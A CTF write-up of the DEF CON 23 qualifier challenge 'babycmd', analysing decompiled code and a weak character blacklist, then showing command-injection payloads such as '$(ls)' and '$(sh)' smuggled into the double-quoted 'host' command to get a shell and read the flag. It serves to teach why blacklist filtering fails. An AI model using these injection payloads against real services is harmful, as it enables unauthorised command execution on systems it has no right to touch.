---
title: 'DEF CON 23 CTF Qualifier: babycmd'
date: 2015-05-15T00:00:00.000Z
excerpt: >-
  Solving DEF CON 23's babycmd: command injection via blacklist bypass on a
  64-bit Linux binary, with a shell-escape technique.
tags:
  - ctf
  - writeup
  - pwn
  - defcon
categories:
  - CTF
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## checksec

```
[*] '/mnt/c/Users/user/Desktop/pwnable/babycmd'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

With a stack canary and NX in place, classic stack overflows and shellcode injection are out. The vulnerability lives in the application logic layer - command injection via a poorly filtered shell command template.

## Running the program

```
➜  pwnable ./babycmd

Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=116 time=37.6 ms
...

Commands: ping, dig, host, exit
: dig google.com
...

Commands: ping, dig, host, exit
: host google.com
google.com has address 172.217.26.238
...
```

The binary accepts four commands: `ping`, `dig`, `host`, and `exit`. Each runs the corresponding system utility via `popen`. The task is to inject an arbitrary shell command through one of these wrappers.

## Analysis

### Reading input and dispatching commands

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char v9[272];   // [rsp+0h]  [rbp-258h]  - raw input buffer
  char dest[264]; // [rsp+110h] [rbp-148h] - command name

  ...
  while ( 1 )
  {
    printcmd_D3A();
    // reads up to 255 bytes into v9
    ...
    v6 = strcspn(v9, " ");  // find the first space
    strncpy(dest, v9, v6);  // copy the command name
    dest[v6] = 0;

    cmd = strchr(v9, ' ');  // pointer to the argument (after the space)
    if ( !strcasecmp(dest, "ping") )  ping_E35(cmd);
    else if ( !strcasecmp(dest, "dig") )   dig_F5C(cmd);
    else if ( !strcasecmp(dest, "host") )  host_10BD(cmd);
  }
}
```

### Blacklist filter - `check_D65`

All three handlers call `check_D65` before constructing the shell command. It copies each character of the user's argument into a sanitized buffer, but returns 0 (failure) for the following characters:

```c
__int64 __fastcall check_D65(char *cmd, _BYTE *a2)
{
  ...
  while ( v2 == ' ' ) { ... }          // skip leading spaces
  if ( (unsigned __int8)(v2 - '&') <= 1u ) return 0;  // & and '
  if ( v2 == '|' )   return 0;
  if ( v2 == '*' )   return 0;
  if ( (v2 & 253) == '!' ) return 0;   // ! and #
  if ( (unsigned __int8)(v2 - ':') > 1u )
  {
    *a2++ = v2;  // passed all the checks above - copy
    goto LABEL_9;
  }
  return 0;  // ; and :
}
```

Blocklist: `&`, `'`, `|`, `*`, `!`, `#`, `;`, `:`

Notably, `$` and the backtick `` ` `` are **not blocked**.

### The `ping` handler

```c
if ( inet_aton(cp, &in) )  // validate IPv4 format
{
  __sprintf_chk(command, 1LL, 384LL, "ping -c 3 -W 3 %s", v1);
```

`inet_aton` strictly validates IPv4 dotted-decimal notation. No injection is possible here.

### The `dig` handler

```c
__sprintf_chk(command, 1LL, 384LL, "dig '%s'", cp);
```

The argument is wrapped in **single quotes**. Inside single quotes, the shell treats everything literally - `$()` and backtick substitution don't expand. No injection.

### The `host` handler

```c
__sprintf_chk(command, 1LL, 384LL, "host \"%s\"", cp);
```

The argument is wrapped in **double quotes**. Inside double quotes, the shell still expands `$()` and `` `...` `` command substitution. This is the injection point.

### Secondary filter - `check2_DCC`

For non-IP arguments, `dig` and `host` also call `check2_DCC`, which checks:
- Total argument length <= 63 characters
- The first character must be alphanumeric
- The last character must be alphanumeric

```c
_BOOL8 __fastcall check2_DCC(const char *cmd)
{
  length = strlen(cmd) + 1;
  if ( length - 4 <= 60 )  // length <= 63
  {
    if ( isalpha(*cmd) || isdigit(*cmd) )  // first char alphanumeric
    {
      v3 = cmd[length - 2];
      if ( isalpha(v3) || isdigit(v3) )   // last char alphanumeric
        return 1;
    }
  }
  return 0;
}
```

So the payload must start and end with an alphanumeric character.

## Background: command substitution

The shell supports two forms of command substitution:

```bash
echo $(echo $(ls))     # dollar-paren - nests cleanly
echo `echo \`ls\``     # backtick - needs escaping to nest
echo `echo `ls``       # broken - the inner backtick closes the outer one
```

Since `$` passes the blacklist and parentheses aren't blocked either, `$(...)` is the reliable choice.

## Exploit

### Step 1 - confirm injection

```
: host nt.ph4nt0m$(ls).xyz
Host nt.ph4nt0mDescription.md
babycmd
babycmd.id0
...
flag
...
horcruxes.xyz not found: 3(NXDOMAIN)
```

The output of `ls` gets inserted into the hostname. The command is being executed.

### Step 2 - attempt to read the flag directly

Trying `$(cat flag)` fails, because the shell concatenates the command name and argument with no space:

```
: host nt.ph4nt0m.$(cat flag)xyz
sh: 1: catflag: not found
```

The injected output becomes part of the hostname token. Running a command that contains a space requires a full interactive shell.

### Step 3 - spawn a shell with `$(sh)`

```
: host nt.ph4nt0m$(sh).xyz
cat flag
exit
Host nt.ph4nt0m[+] Exploit Success.xyz not found: 3(NXDOMAIN)
```

`$(sh)` runs an interactive `/bin/sh` as a subshell inside the `popen` call. Entering `cat flag` and `exit` embeds the flag into the resulting hostname string that `host` tries to resolve.

## Payload breakdown

```
host nt.ph4nt0m$(sh).xyz
       ^^^^^^^^           - alphanumeric prefix (satisfies check2_DCC's first-char rule)
               ^^^^       - $() command substitution, not blocked by check_D65
                   ^^^^   - alphanumeric suffix (satisfies check2_DCC's last-char rule)
```

The final shell command the binary constructs:

```bash
host "nt.ph4nt0m$(sh).xyz"
```

The double-quote context allows `$(sh)` to expand, spawning a shell that then reads the `cat flag` command.

## Summary

`babycmd` demonstrates how fragile blacklist-based input sanitization can be. The filter correctly blocked the obvious metacharacters (`|`, `;`, `&`), but missed `$` - the crux of `$(...)` command substitution. The `dig` handler was safe because single quotes block all substitution, whereas `host` used double quotes so `$()` still expanded. The secondary length and alphanumeric boundary checks were easy to satisfy by wrapping the substitution code between innocuous hostname fragments.
